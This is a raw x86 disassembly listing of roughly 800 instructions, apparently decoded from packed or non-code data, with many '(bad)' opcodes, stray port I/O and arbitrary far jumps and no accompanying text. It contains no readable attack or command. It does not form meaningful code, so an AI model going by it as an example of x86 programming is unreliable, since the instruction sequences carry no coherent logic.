  408d04:	test   al,0x66
  408d06:	mov    dh,0xba
  408d08:	or     bl,dl
  408d0a:	mov    dh,0x38
  408d0c:	ja     0x408d4c
  408d0e:	mov    edi,0x6dfd0596
  408d13:	fstp   TBYTE PTR [esi+0x83b2519]
  408d19:	aad    0x0
  408d1b:	cmp    ebp,DWORD PTR [ebp-0x466240d7]
  408d21:	in     eax,dx
  408d22:	rcr    bl,cl
  408d24:	rcr    BYTE PTR [ebx-0x76],cl
  408d27:	cmp    BYTE PTR [ebx+0x2c000dbf],bl
  408d2d:	add    eax,0x68508e05
  408d32:	lods   eax,DWORD PTR ds:[esi]
  408d33:	sub    eax,0xee82bf6c
  408d38:	jg     0x408d60
  408d3a:	add    ebp,DWORD PTR [edi+edi*8]
  408d3d:	lods   eax,DWORD PTR ds:[esi]
  408d3e:	je     0x408d1b
  408d40:	stc    
  408d41:	rcl    BYTE PTR [edi],0xe7
  408d44:	jb     0x408d5a
  408d46:	mov    edi,0x9300527d
  408d4b:	jbe    0x408d4d
  408d4d:	in     al,0x63
  408d4f:	div    BYTE PTR [ecx+eiz*4+0x2d]
  408d53:	les    eax,FWORD PTR ds:0xbf56c976
  408d59:	pop    ebx
  408d5a:	adc    DWORD PTR [ebp-0x483938db],esp
  408d60:	ror    al,0xff
  408d63:	xchg   edx,eax
  408d64:	clc    
  408d65:	and    BYTE PTR [ebp+0x37],ch
  408d68:	mov    dh,0x8d
  408d6a:	mov    bl,0x15
  408d6c:	mov    ecx,0xcb212fbf
  408d71:	and    ch,BYTE PTR [ebp-0x3d2520d5]
  408d77:	lods   eax,DWORD PTR ds:[esi]
  408d78:	mov    edi,0x88599c44
  408d7d:	push   ds
  408d7e:	gs mov edi,0xef002e07
  408d84:	or     dh,BYTE PTR ss:[edi-0x6fffe70e]
  408d8b:	(bad)  
  408d8d:	mov    al,0x7d
  408d8f:	adc    ebp,DWORD PTR [ecx-0x7f]
  408d92:	clc    
  408d93:	ins    DWORD PTR es:[edi],dx
  408d94:	pop    ebx
  408d95:	fidivr DWORD PTR [edi-0x58fc431a]
  408d9b:	je     0x408d41
  408d9d:	jno    0x408e1b
  408d9f:	add    BYTE PTR [ecx+edx*4+0x2c],dl
  408da3:	fcomp  QWORD PTR [edx]
  408da5:	fist   WORD PTR [ebx-0x1c9aff1a]
  408dab:	inc    ebp
  408dac:	add    eax,0xd7b8dc27
  408db1:	ds pop ebp
  408db3:	fisubr DWORD PTR [eax]
  408db5:	lods   al,BYTE PTR ds:[esi]
  408db6:	pop    edx
  408db7:	push   0xbfca4b53
  408dbc:	mov    edx,0xfb6dd6fa
  408dc1:	(bad)  
  408dc2:	mov    al,0xbf
  408dc4:	cmp    al,0xbb
  408dc6:	add    BYTE PTR [ecx],bh
  408dc8:	inc    ecx
  408dc9:	or     al,0x95
  408dcb:	sbb    DWORD PTR [esi-0x3449ea81],ebp
  408dd1:	jmp    FWORD PTR [ebx+0x9eb300]
  408dd7:	pop    edi
  408dd8:	test   BYTE PTR [eax],al
  408dda:	and    BYTE PTR ds:0xa6ed0510,bl
  408de0:	mov    cl,0xb5
  408de2:	mov    al,0xb5
  408de4:	fst    QWORD PTR [ecx]
  408de6:	sar    BYTE PTR [edi+0x48e73f7],1
  408dec:	jmp    0x408da4
  408dee:	mov    ch,0xb0
  408df0:	rol    BYTE PTR [ecx],0xd3
  408df3:	les    esi,FWORD PTR [ebx-0x23]
  408df6:	mov    eax,ds:0xdae573f5
  408dfb:	pop    esp
  408dfc:	dec    ebx
  408dfd:	pop    ebx
  408dfe:	lods   eax,DWORD PTR ds:[esi]
  408dff:	xchg   edi,eax
  408e00:	sbb    ch,al
  408e02:	jg     0x408de7
  408e04:	fcomp  st(2)
  408e06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e07:	repnz pop edi
  408e09:	xor    bh,bh
  408e0b:	pop    edx
  408e0c:	add    cl,bl
  408e0e:	push   edi
  408e0f:	add    BYTE PTR [esi+0x6a],al
  408e12:	add    eax,0x44cb4bcc
  408e17:	pop    ebp
  408e18:	push   0x39fc13b7
  408e1d:	xlat   BYTE PTR ds:[ebx]
  408e1e:	and    bh,BYTE PTR [ebp-0x4b8a54c5]
  408e24:	pop    ebp
  408e25:	ror    bh,0x2c
  408e28:	mov    eax,ds:0x58adbd3f
  408e2d:	imul   ebx,ebx,0xffffffda
  408e30:	ins    DWORD PTR es:[edi],dx
  408e31:	mov    ebx,0x131fa1c8
  408e36:	add    eax,0x6494d4e3
  408e3b:	sti    
  408e3c:	mov    ch,0xb4
  408e3e:	jno    0x408dd1
  408e40:	xchg   ebp,eax
  408e41:	pop    edx
  408e42:	jno    0x408e4c
  408e44:	push   es
  408e45:	jg     0x408e77
  408e47:	(bad)  
  408e48:	aam    0xc2
  408e4a:	ins    DWORD PTR es:[edi],dx
  408e4b:	sti    
  408e4c:	inc    edx
  408e4d:	sar    DWORD PTR [eax-0x9],cl
  408e50:	add    BYTE PTR [ebp-0x59],dh
  408e53:	dec    eax
  408e54:	pop    ss
  408e55:	ja     0x408e41
  408e57:	jg     0x408e71
  408e59:	mov    dh,0xc2
  408e5b:	(bad)  
  408e5c:	shl    bh,0xda
  408e5f:	mov    BYTE PTR [edi],dl
  408e61:	pop    esp
  408e62:	jg     0x408ebf
  408e64:	mov    ebx,0x6c972ed0
  408e69:	test   eax,0xcb4d91b9
  408e6e:	adc    al,0xe3
  408e70:	aas    
  408e71:	adc    DWORD PTR [edx-0x5f],0x4000d4f0
  408e78:	mov    edi,0x8f6f2b7f
  408e7d:	(bad)  
  408e7e:	out    0x7f,al
  408e80:	pusha  
  408e81:	mov    dl,0x3f
  408e83:	mov    BYTE PTR [edx+0x9a5300],dl
  408e89:	and    al,0x17
  408e8b:	add    BYTE PTR [ecx+eiz*8],ah
  408e8e:	add    BYTE PTR ds:0xb0b0a396,ah
  408e94:	jge    0x408e51
  408e96:	mov    dh,0x47
  408e98:	mov    al,0x9d
  408e9a:	xchg   DWORD PTR [eax-0x5481a937],ecx
  408ea0:	jno    0x408eda
  408ea2:	add    eax,0x77f9a30f
  408ea7:	add    BYTE PTR [edi+0x4a],ah
  408eaa:	mov    edi,0xe369e466
  408eaf:	in     al,dx
  408eb0:	imul   eax,eax,0xfffffff9
  408eb3:	mov    edi,0x466956d9
  408eb8:	sahf   
  408eb9:	xchg   ecx,eax
  408eba:	fs loop 0x408eb0
  408ebd:	sub    eax,DWORD PTR [edx]
  408ebf:	xchg   ecx,eax
  408ec0:	data16 in al,0x19
  408ec3:	mov    ch,0x9d
  408ec5:	sub    DWORD PTR [eax],ebp
  408ec7:	sbb    DWORD PTR [ecx+0x46],ebp
  408eca:	sahf   
  408ecb:	mov    ds:0x5bce1cbf,eax
  408ed0:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  408ed2:	arpl   sp,sp
  408ed4:	inc    ecx
  408ed5:	repz dec esp
  408ed8:	inc    edi
  408ed9:	jns    0x408f21
  408edb:	call   0x1529:0xeac67b91
  408ee2:	xchg   ecx,eax
  408ee3:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  408ee5:	sbb    DWORD PTR [ecx+0x19373280],esp
  408eeb:	jns    0x408f33
  408eed:	call   0x9a6f:0x4d2ec2ea
  408ef4:	xchg   ecx,eax
  408ef5:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  408ef7:	cmp    dh,ah
  408ef9:	scas   eax,DWORD PTR es:[edi]
  408efa:	push   esi
  408efb:	push   ds
  408efc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408efd:	sbb    DWORD PTR [ecx+0x46],edi
  408f00:	lds    eax,FWORD PTR [ecx-0x65b983a1]
  408f06:	xchg   ecx,eax
  408f07:	addr16 mov al,ds:0x1beb
  408f0b:	pop    edx
  408f0c:	test   BYTE PTR [ecx],ah
  408f0e:	mov    dl,0x1c
  408f10:	jns    0x408ee7
  408f12:	sbb    bh,BYTE PTR [esi]
  408f14:	inc    eax
  408f15:	adc    ebx,edi
  408f17:	push   ss
  408f18:	mov    dh,0x76
  408f1a:	inc    eax
  408f1b:	lea    edi,[ebp-0x5f]
  408f1e:	jno    0x408f0b
  408f20:	icebp  
  408f21:	lods   eax,DWORD PTR ds:[esi]
  408f22:	adc    esp,DWORD PTR [esi-0x27209c00]
  408f28:	mov    dh,0x1b
  408f2a:	aas    
  408f2b:	popa   
  408f2c:	gs add eax,0x3fd68fa1
  408f32:	rol    DWORD PTR [eax],cl
  408f34:	(bad)  
  408f35:	not    BYTE PTR ds:0x1d6a581a
  408f3b:	add    eax,0xa93cff48
  408f40:	push   esi
  408f41:	outs   dx,BYTE PTR ds:[esi]
  408f42:	mov    al,0xb5
  408f44:	imul   esp,DWORD PTR [edi+0xd],0x39
  408f48:	enter  0x8a9c,0x17
  408f4c:	outs   dx,BYTE PTR ds:[esi]
  408f4d:	xchg   esp,eax
  408f4e:	inc    esi
  408f50:	sub    al,0x3f
  408f52:	sub    DWORD PTR [ecx],esi
  408f54:	add    BYTE PTR [ecx+ebx*8],bl
  408f57:	add    BYTE PTR [ecx-0x62],bh
  408f5a:	call   DWORD PTR [esi+ebp*4-0x2e4575c5]
  408f61:	stos   BYTE PTR es:[edi],al
  408f62:	fcom   DWORD PTR [eax]
  408f64:	(bad)  
  408f65:	retf   
  408f66:	xor    ch,bh
  408f68:	mov    dh,0x5f
  408f6a:	sbb    ecx,DWORD PTR [ebx]
  408f6c:	call   0x2283:0x7f7f3f82
  408f73:	mov    eax,ds:0x6360fb73
  408f78:	fistp  DWORD PTR [ecx+esi*8-0x53]
  408f7c:	adc    DWORD PTR [esi],ebx
  408f7e:	mov    di,0x572
  408f82:	retf   
  408f83:	jg     0x408f28
  408f85:	jno    0x408f2e
  408f87:	or     BYTE PTR [ebp+0x3f],al
  408f8a:	aad    0xed
  408f8c:	add    al,ch
  408f8e:	xor    eax,0x474a9f00
  408f93:	fistp  WORD PTR [eax+0x58]
  408f96:	push   0x91bba9d1
  408f9b:	mov    esp,0xa4b93f
  408fa0:	mov    WORD PTR ds:0x49f28dff,gs
  408fa6:	add    cl,ah
  408fa8:	cs (bad) 
  408faa:	cmp    DWORD PTR [esi],ebx
  408fac:	add    bh,bl
  408fae:	ins    BYTE PTR es:[edi],dx
  408faf:	add    BYTE PTR [eax-0x24a078e1],ah
  408fb5:	test   DWORD PTR [esi-0x2c3792fb],esi
  408fbb:	xchg   ecx,eax
  408fbc:	(bad)  
  408fbe:	xor    bh,BYTE PTR [edi-0x7c]
  408fc1:	lea    ebp,[ebp+0x44413370]
  408fc7:	or     DWORD PTR [edi-0x77],0x37fcff75
  408fce:	push   ss
  408fcf:	mov    dh,0xfc
  408fd1:	lods   eax,DWORD PTR ds:[esi]
  408fd2:	pop    ss
  408fd3:	dec    edi
  408fd4:	push   0x75653f
  408fd9:	pop    eax
  408fda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fdb:	add    BYTE PTR [edi],dh
  408fdd:	fimul  DWORD PTR [ebp-0x5c9e93]
  408fe3:	fidiv  WORD PTR [esi+0x2b]
  408fe6:	ror    DWORD PTR [edi+edi*1-0x65],1
  408fea:	fsubr  DWORD PTR [eax]
  408fec:	dec    DWORD PTR [ecx+0x5d]
  408fef:	add    BYTE PTR [ecx+edi*4+0x0],bh
  408ff3:	sub    DWORD PTR [esi-0x2b806901],edi
  408ff9:	add    BYTE PTR [ebx-0xd],dh
  408ffc:	jl     0x408f98
  408ffe:	xor    BYTE PTR [esi],ah
  409000:	inc    ebx
  409001:	mov    ds:0x1400f28d,al
  409006:	sbb    dh,BYTE PTR ss:[edi-0x55cb5df3]
  40900d:	ins    DWORD PTR es:[edi],dx
  40900e:	xchg   BYTE PTR [edi],bh
  409010:	call   FWORD PTR [ebx+0x1697fcad]
  409016:	push   ebp
  409017:	xchg   DWORD PTR [ecx-0x8],esi
  40901a:	ja     0x40901c
  40901c:	cmc    
  40901d:	inc    DWORD PTR [eax]
  40901f:	enter  0x7415,0x28
  409023:	sbb    ebx,ebx
  409025:	(bad)  
  409026:	jmp    0x179afa2a
  40902b:	ds inc ebp
  40902d:	pop    ebx
  40902e:	fistp  WORD PTR [eax+0x58]
  409031:	pop    eax
  409032:	mov    ch,0xec
  409034:	shl    BYTE PTR [ecx+0x53ffcd9d],1
  40903a:	jle    0x40903c
  40903c:	mov    edi,0xf28d8db7
  409041:	sbb    al,0x0
  409043:	sar    BYTE PTR [edi],0xb1
  409046:	xor    BYTE PTR [edi+0x2fb1a1eb],0x6c
  40904d:	int    0x4b
  40904f:	ins    BYTE PTR es:[edi],dx
  409050:	imul   edx,DWORD PTR [edx],0x7f
  409053:	jp     0x409055
  409055:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409056:	xchg   edx,eax
  409057:	add    eax,0x6b71b061
  40905c:	sub    al,0xa0
  40905e:	push   ss
  40905f:	aas    
  409060:	pop    esp
  409061:	pop    ss
  409062:	ss int3 
  409064:	push   eax
  409065:	push   0xffffffcb
  409067:	jg     0x40900c
  409069:	popf   
  40906a:	aas    
  40906b:	test   esp,edi
  40906d:	add    BYTE PTR [eax-0x5fcff7b],bh
  409073:	test   DWORD PTR [ecx-0x47],0xa15b75bc
  40907a:	or     esp,DWORD PTR [ebx]
  40907c:	ins    BYTE PTR es:[edi],dx
  40907d:	jmp    0x4090fe
  40907f:	jge    0x409081
  409081:	pop    esp
  409082:	sbb    eax,0x716c6fde
  409087:	jecxz  0x40905b
  409089:	push   ecx
  40908a:	das    
  40908b:	test   al,0x78
  40908d:	iret   
  40908e:	jmp    DWORD PTR [eax+0x0]
  409091:	jo     0x409035
  409093:	ins    DWORD PTR es:[edi],dx
  409094:	xchg   edi,eax
  409095:	xchg   edi,eax
  409096:	mov    ebp,0xaa4100c2
  40909b:	xor    BYTE PTR [eax+0x5b1ba1ce],0x63
  4090a2:	imul   edi,DWORD PTR [edi+0x22],0xffffffad
  4090a6:	rcr    DWORD PTR [ebp-0x23],1
  4090a9:	and    eax,0x4c17bb93
  4090ae:	xor    al,0x6e
  4090b0:	add    eax,0x7f45ec67
  4090b5:	jp     0x4090df
  4090b7:	cmc    
  4090b8:	cld    
  4090b9:	aaa    
  4090ba:	push   ss
  4090bb:	sbb    dh,BYTE PTR [ebp-0x63]
  4090be:	or     edi,edi
  4090c0:	sahf   
  4090c1:	mov    edx,0xa7b00
  4090c6:	cld    
  4090c7:	jnp    0x409100
  4090c9:	push   ss
  4090ca:	fisubr DWORD PTR [ebp+0x6e09ccfe]
  4090d0:	pop    ebx
  4090d1:	in     eax,dx
  4090d2:	(bad)  
  4090d3:	jns    0x409133
  4090d5:	lods   eax,DWORD PTR ds:[esi]
  4090d6:	ret    0xfcad
  4090d9:	add    BYTE PTR [edi+0x5fe00010],bl
  4090df:	jno    0x4090c1
  4090e1:	sub    eax,0xbcc19185
  4090e6:	ror    BYTE PTR [ebp+0x7246ffd1],0xff
  4090ed:	ss add ah,al
  4090f0:	aaa    
  4090f1:	mov    dh,0x8d
  4090f3:	lods   eax,DWORD PTR ds:[esi]
  4090f4:	jo     0x40907a
  4090f6:	inc    ecx
  4090f7:	mov    ecx,DWORD PTR [ebx]
  4090f9:	mov    ch,0xff
  4090fb:	lods   eax,DWORD PTR ss:[esi]
  4090fd:	xlat   BYTE PTR ds:[ebx]
  4090fe:	mov    ds:0x6b9637fc,eax
  409103:	test   al,0x3f
  409105:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409106:	test   al,0x0
  409108:	cwde   
  409109:	gs add bl,dh
  40910c:	sbb    bh,bh
  40910e:	dec    DWORD PTR [ebp+0x2a6a7685]
  409114:	fisub  DWORD PTR [esp+ecx*4+0x3f]
  409118:	mov    DWORD PTR [ebx+0x79bc00],ebp
  40911e:	paddd  mm0,QWORD PTR [ecx-0xd72493]
  409125:	jecxz  0x4090b6
  409127:	paddd  mm6,QWORD PTR [eax-0x1]
  40912b:	sbb    ecx,DWORD PTR [ebx-0x7b]
  40912e:	fwait
  40912f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409130:	push   eax
  409131:	popf   
  409132:	and    cl,BYTE PTR [ebp+0x61]
  409135:	push   esi
  409137:	stc    
  409138:	outs   dx,DWORD PTR ds:[esi]
  409139:	mov    ah,0x6e
  40913b:	add    eax,0x3f915c23
  409140:	push   ecx
  409141:	pop    eax
  409142:	add    BYTE PTR [ecx+esi*4+0x0],dh
  409146:	ret    
  409147:	mov    BYTE PTR [edi],0x96
  40914a:	inc    DWORD PTR [esi-0x1]
  40914d:	int3   
  40914e:	xchg   BYTE PTR [eax],al
  409150:	inc    edi
  409151:	xor    al,BYTE PTR [eax]
  409153:	cmp    BYTE PTR [edi+0x46793f29],dh
  409159:	call   0x970c:0x18bba591
  409160:	xchg   ecx,eax
  409161:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  409163:	sbb    DWORD PTR [ebp+0x1971eb06],esi
  409169:	jns    0x4091b1
  40916b:	call   0x9a4b:0x5bd4e47c
  409172:	xchg   ecx,eax
  409173:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  409175:	retf   0x3dc4
  409178:	ds push eax
  40917a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40917b:	sbb    DWORD PTR [ecx+0x46],edi
  40917e:	fdivr  DWORD PTR ds:0x9a468834
  409184:	xchg   ecx,eax
  409185:	addr16 xchg ecx,eax
  409187:	pop    ds
  409188:	icebp  
  409189:	outs   dx,BYTE PTR ds:[esi]
  40918a:	movs   BYTE PTR es:[di],BYTE PTR gs:[si]
  40918d:	sbb    DWORD PTR [ecx-0xf],edi
  409190:	repz dec esp
  409192:	dec    ecx
  409193:	jns    0x4091db
  409195:	call   0xa520:0x2aeedb91
  40919c:	xchg   ecx,eax
  40919d:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40919f:	sbb    DWORD PTR [eax+esi*1+0x79198701],esp
  4091a6:	inc    esi
  4091a7:	call   0xdb0e:0x69e41693
  4091ae:	fcomp  st(2)
  4091b0:	ins    DWORD PTR es:[edi],dx
  4091b1:	push   edi
  4091b2:	sar    DWORD PTR [eax+0x5e],1
  4091b5:	das    
  4091b6:	sub    BYTE PTR [edx-0x1],0x67
  4091ba:	xor    eax,0x6ddad85d
  4091bf:	inc    edx
  4091c0:	ja     0x409231
  4091c2:	cmp    DWORD PTR ds:0x5aca771d,eax
  4091c8:	jle    0x409168
  4091ca:	xchg   ecx,eax
  4091cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091cc:	lods   eax,DWORD PTR ds:[esi]
  4091cd:	jmp    0x40917c
  4091cf:	ds mov edi,0xe4688ffd
  4091d5:	sbb    DWORD PTR [ecx+0x46],ebp
  4091d8:	sub    bl,bl
  4091da:	lea    edx,[edx+0x46]
  4091dd:	sahf   
  4091de:	xchg   ecx,eax
  4091df:	popw   ss
  4091e1:	shl    DWORD PTR [eax-0x4c],0xf7
  4091e5:	data16 in al,0x19
  4091e8:	imul   esp,DWORD PTR [edi],0x69dce670
  4091ee:	inc    esi
  4091ef:	sahf   
  4091f0:	xchg   ecx,eax
  4091f1:	jne    0x409246
  4091f3:	sub    BYTE PTR [ecx-0x1b996eed],0x19
  4091fa:	cmp    eax,0x1929959a
  4091ff:	imul   eax,DWORD PTR [esi-0x62],0xcf43bc07
  409206:	nop
  409207:	sahf   
  409208:	xchg   ecx,eax
  409209:	data16 in al,0x19
  40920c:	dec    ebp
  40920d:	mov    ah,0xe4
  40920f:	and    esp,esp
  409211:	sbb    DWORD PTR [ecx+0x46],ebp
  409214:	jge    0x4091e8
  409216:	lods   eax,DWORD PTR ds:[esi]
  409217:	pop    ebp
  409218:	inc    esi
  409219:	sahf   
  40921a:	xchg   ecx,eax
  40921b:	data16 and cl,al
  40921e:	mov    ds:0xe4661d7f,al
  409223:	sbb    DWORD PTR [ecx-0x12],ebp
  409226:	ins    BYTE PTR es:[edi],dx
  409227:	xchg   ecx,eax
  409228:	jmp    0x790c:0x919e4669
  40922f:	mov    ebx,0x66912ad8
  409234:	in     al,0x19
  409236:	push   0x1950a7a5
  40923b:	imul   eax,DWORD PTR [esi-0x62],0x768ac720
  409242:	xor    DWORD PTR [edi-0x161b991a],ebx
  409248:	(bad)  
  409249:	std    
  40924a:	add    cl,bh
  40924c:	fild   QWORD PTR [eax+0x6b]
  40924f:	out    0xd3,eax
  409251:	fdivr  QWORD PTR [edx+edx*2]
  409254:	fild   DWORD PTR [eax]
  409256:	fucomp st(6)
  409258:	push   edx
  409259:	dec    edi
  40925a:	repz jl 0x4091f7
  40925d:	fwait
  40925e:	pop    ecx
  40925f:	rol    DWORD PTR [eax],0xc1
  409262:	test   al,0x34
  409264:	xor    esi,DWORD PTR [esi]
  409266:	ins    DWORD PTR es:[edi],dx
  409267:	sbb    BYTE PTR [edx+0x73],cl
  40926a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40926b:	add    BYTE PTR [ebp-0x5357b07b],ah
  409271:	aaa    
  409272:	iret   
  409273:	ucomiss xmm3,xmm5
  409276:	out    dx,eax
  409277:	lock mov edi,0x743d0719
  40927d:	add    BYTE PTR [ecx-0x1a],bh
  409280:	out    0xf9,al
  409282:	xor    al,0x63
  409284:	jecxz  0x409271
  409286:	jmp    0x3cdc:0xd35d0052
  40928d:	lahf   
  40928e:	push   ecx
  40928f:	(bad)  
  409291:	lock dec eax
  409293:	add    BYTE PTR [ecx+0x2d],al
  409296:	jl     0x409232
  409298:	fwait
  409299:	out    0xbf,eax
  40929b:	mov    bl,0xbe
  40929d:	add    BYTE PTR cs:0x9e979105,ah
  4092a4:	dec    edi
  4092a5:	jae    0x40929a
  4092a7:	scas   eax,DWORD PTR es:[edi]
  4092a8:	or     al,0x0
  4092aa:	or     DWORD PTR [eax+ebx*8+0x79],edi
  4092ae:	dec    edi
  4092af:	int    0xf3
  4092b1:	imul   ebp,DWORD PTR [esi+0x4b],0xc2e0ef00
  4092b8:	pop    ebp
  4092b9:	dec    edi
  4092ba:	jno    0x409257
  4092bc:	jp     0x4092fc
  4092be:	int    0x0
  4092c0:	rol    eax,cl
  4092c2:	in     al,0x41
  4092c4:	adc    bh,BYTE PTR [edi]
  4092c6:	pop    ss
  4092c7:	add    al,bl
  4092c9:	xchg   BYTE PTR [edx+ebx*4-0x49],bh
  4092cd:	mov    ds:0x9b4a25b6,al
  4092d2:	jae    0x4092c7
  4092d4:	jl     0x409310
  4092d6:	mov    edi,0x1f09908f
  4092db:	jecxz  0x4092dd
  4092dd:	jg     0x409348
  4092df:	outs   dx,BYTE PTR ds:[esi]
  4092e0:	sahf   
  4092e1:	dec    edi
  4092e2:	jnp    0x40934e
  4092e4:	in     eax,dx
  4092e5:	in     eax,0xf9
  4092e7:	add    BYTE PTR [ebx+0x24],ah
  4092ea:	ds int 0xcd
  4092ed:	repz int3 
  4092ef:	rcr    esi,cl
  4092f1:	pop    edi
  4092f2:	add    BYTE PTR [ebp+0x33],al
  4092f5:	scas   al,BYTE PTR es:[edi]
  4092f6:	mov    bh,0xcf
  4092f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092f9:	mov    ecx,0x3dba79
  4092fe:	sub    DWORD PTR [esi],ebp
  409300:	mov    BYTE PTR [ebx+0x34f9e689],bl
  409306:	aaa    
  409307:	sbb    eax,DWORD PTR [eax]
  409309:	or     eax,0x727f9219
  40930e:	fdivr  QWORD PTR [edi+ebx*4]
  409311:	out    0xe1,al
  409313:	add    cl,dh
  409315:	aad    0x74
  409317:	arpl   WORD PTR [edx],sp
  409319:	hlt    
  40931a:	add    ch,dl
  40931c:	out    0x8e,al
  40931e:	out    0xd3,eax
  409320:	fsubr  QWORD PTR [ebx+0x47]
  409323:	dec    ebp
  409324:	call   FWORD PTR [edx-0x527c4700]
  40932a:	and    DWORD PTR [edi+0x732b0db8],ebx
  409330:	popf   
  409331:	mov    edi,0xa7cf3734
  409336:	mov    ecx,DWORD PTR [edi]
  409338:	bndstx [esi-0x608b7f00],bnd3
  40933f:	out    0xe6,al
  409341:	stc    
  409342:	jmp    0xbd8f3a
  409347:	gs popa 
  409349:	ret    
  40934a:	xlat   BYTE PTR ds:[ebx]
  40934b:	out    0xd3,eax
  40934d:	fdivr  QWORD PTR [esi+ebp*4]
  409350:	in     al,0x0
  409352:	dec    ebx
  409353:	jg     0x409368
  409355:	mov    ecx,0x9b9a7cf3
  40935a:	mov    edi,0x2a2f0082
  40935f:	adc    ebx,DWORD PTR [ebp+0x4f9e6ea1]
  409365:	jae    0x409320
  409367:	add    BYTE PTR [ebx],dl
  409369:	push   es
  40936a:	sub    al,0x81
  40936c:	push   edx
  40936d:	pop    edi
  40936e:	add    bh,dh
  409370:	int    0xcd
  409372:	repz imul edi,edi,0x6a6d65ce
  409379:	add    bl,bl
  40937b:	leave  
  40937c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40937d:	mov    ecx,0x49fd3e79
  409382:	dec    esi
  409383:	adc    al,0x0
  409385:	mov    edi,0x3734f9a7
  40938a:	iret   
  40938b:	popf   
  40938c:	sub    eax,0xa3000525
  409391:	in     al,0x39
  409393:	adc    edi,DWORD PTR [edi+ebx*4]
  409396:	out    0xe6,al
  409398:	push   ds
  409399:	lods   al,BYTE PTR ds:[esi]
  40939a:	add    BYTE PTR [ebp-0x5082c8d],al
  4093a0:	fwait
  4093a1:	out    0xd3,eax
  4093a3:	fadd   QWORD PTR [edx+0x0]
  4093a6:	imul   ebp,DWORD PTR [esi-0xb],0x68c6db
  4093ad:	ins    BYTE PTR es:[edi],dx
  4093ae:	shl    bl,0x90
  4093b1:	dec    ebp
  4093b2:	out    0xbf,eax
  4093b4:	test   al,0x3f
  4093b6:	push   ss
  4093b7:	mov    al,0xb5
  4093b9:	dec    edi
  4093ba:	repz adc eax,0x65a2e281
  4093c0:	sub    al,0x8b
  4093c2:	push   ebx
  4093c3:	in     eax,dx
  4093c4:	(bad)  
  4093c5:	mov    dh,0x7f
  4093c7:	stos   DWORD PTR es:[edi],eax
  4093c8:	dec    edx
  4093c9:	xchg   esi,eax
  4093ca:	jg     0x40937f
  4093cc:	cld    
  4093cd:	cmp    edi,0x73
  4093d0:	jae    0x409445
  4093d2:	jae    0x4093d9
  4093d4:	add    BYTE PTR [ebx+0xe],ah
  4093d7:	add    BYTE PTR [edx+0x17],bh
  4093da:	add    BYTE PTR [ebx+0x10],bh
  4093dd:	add    BYTE PTR [ecx],ch
  4093df:	mov    eax,ds:0xe626532d
  4093e4:	push   DWORD PTR [esi+0x2a]
  4093e7:	mov    edi,0xa467919a
  4093ec:	mov    cl,0xea
  4093ee:	cmp    al,0x23
  4093f0:	iret   
  4093f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093f2:	sbb    DWORD PTR [ecx+0x46],edi
  4093f5:	mov    bl,0x5e
  4093f7:	sub    eax,0x919a46ed
  4093fc:	xor    BYTE PTR [bx+si+0x1b],0x3
  409401:	bound  edi,QWORD PTR [ecx-0x6586e65c]
  409407:	shr    DWORD PTR [ecx],1
  409409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40940a:	xchg   ecx,eax
  40940b:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40940d:	sbb    edi,ecx
  40940f:	aaa    
  409410:	add    esi,eax
  409412:	cmp    al,0x3f
  409414:	inc    esi
  409415:	call   0x96e8:0xff2155aa
  40941c:	out    dx,al
  40941d:	int    0xc8
  40941f:	rcr    esp,cl
  409421:	xchg   BYTE PTR [eax],al
  409423:	or     ebp,DWORD PTR [esi]
  409425:	icebp  
  409426:	outs   dx,DWORD PTR ds:[esi]
  409427:	ror    BYTE PTR fs:[esp+edi*1+0x75ebff23],cl
  40942f:	pop    edx
  409430:	and    ecx,ebp
  409432:	enter  0xd133,0xcd
  409436:	xor    BYTE PTR ss:[esi+0x3c8cd233],al
  40943d:	scas   eax,DWORD PTR es:[edi]
  40943e:	aas    
  40943f:	push   ds
  409440:	cmp    BYTE PTR [ebx+eiz*1],0xcd
  409444:	enter  0xf89,0xfc
  409448:	ins    DWORD PTR es:[edi],dx
  409449:	jae    0x409489
  40944b:	xor    al,0xd2
  40944d:	mov    ebx,ss
  40944f:	loop   0x4094ad
  409451:	mov    edi,0x63f3d155
  409456:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409457:	jns    0x40944c
  409459:	cmp    BYTE PTR [eax-0x1],al
  40945c:	and    BYTE PTR [ebp-0x3232c187],dh
  409462:	pushf  
  409463:	mov    bl,0x0
  409465:	sub    edi,DWORD PTR [ecx]
  409467:	or     bl,BYTE PTR [ecx-0x5830c873]
  40946d:	mov    ecx,0x3b0f0099
  409472:	adc    al,0x7d
  409474:	push   0x67
  409476:	add    bl,dh
  409478:	out    0xe6,al
  40947a:	stc    
  40947b:	xor    al,0xfb
  40947d:	mul    BYTE PTR [ecx+0x51]
  409480:	inc    ebp
  409481:	add    bh,dl
  409483:	rcr    esp,cl
  409485:	cmp    al,0x9f
  409487:	aad    0xd8
  409489:	inc    ebp
  40948a:	jne    0x4094b7
  40948c:	add    BYTE PTR [ebx-0x64646857],bh
  409492:	out    0xa2,eax
  409494:	sub    DWORD PTR [ebx],esp
  409496:	adc    DWORD PTR [eax],eax
  409498:	lahf   
  409499:	call   0xde47b9e
  40949e:	push   ebp
  40949f:	mov    ebx,0xc5263db0
  4094a4:	aas    
  4094a5:	push   ss
  4094a6:	inc    DWORD PTR cs:[ecx+0x46]
  4094aa:	loope  0x409502
  4094ac:	mov    ebx,0xadf7d6d4
  4094b1:	mov    al,ds:0x7ee58ccb
  4094b6:	les    eax,FWORD PTR [esi+0x63]
